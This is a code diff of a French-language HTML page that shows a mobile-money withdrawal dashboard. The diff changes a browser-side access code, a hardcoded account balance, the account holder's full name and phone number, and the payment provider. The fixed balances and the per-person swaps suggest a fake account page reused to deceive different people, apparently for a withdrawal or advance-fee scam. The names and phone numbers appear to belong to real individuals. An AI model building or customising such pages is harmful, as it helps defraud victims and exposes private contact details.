@@ -237,7 +237,7 @@
 <body>
     <script>
         let code = prompt("Veuillez entrer le code d'accès :");
-        if (code === "1122") {
+        if (code === "8080") {
             document.body.style.display = 'block';
         } else {
             alert("Code incorrect. Accès refusé.");
@@ -251,10 +251,10 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 280 000 F CFA </span>
+                <span class="balance">Solde: 650 000 F CFA </span>
                 <div class="account-info">
-                    <span id="user-name"> IPAPOULYOUBI GERAUD DAHYANN </span><br>
-                    <span id="user-phone">241 077 77 32 03</span>
+                    <span id="user-name"> DIOUF BERNADETTE ANNA TENING  </span><br>
+                    <span id="user-phone">221 772 48 69 17 </span>
                 </div>
                 <button id="whatsapp-button">Contact WhatsApp</button>
                 <button id="logout-button">Déconnexion</button>
@@ -282,7 +282,7 @@
                 </div>
             </section>
             <section class="withdrawal-options">
-                <button id="orange-money">Retrait via Airtel Money</button>
+                <button id="orange-money">Retrait via Wave Money</button>
             </section>
             <section class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
@@ -314,10 +314,10 @@
             setInterval(updatePrice, 5000);
 
             const setWithdrawalInfo = () => {
-                const paymentMethod = "Airtel Money";
-                const accountName = "IPAPOULYOUBI GERAUD DAHYANN";
-                const accountNumber = "241 077 77 32 03";
-                    withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 280 000 F CFA`;
+                const paymentMethod = "Wave Money";
+                const accountName = "DIOUF BERNADETTE ANNA TENING";
+                const accountNumber = "221 772 48 69 17";
+                    withdrawalInfo.innerHTML = `${accountName}<br><br> ${accountNumber}<br><br> 650 000 F CFA`;
                 withdrawalForm.style.display = 'flex';
             };
 
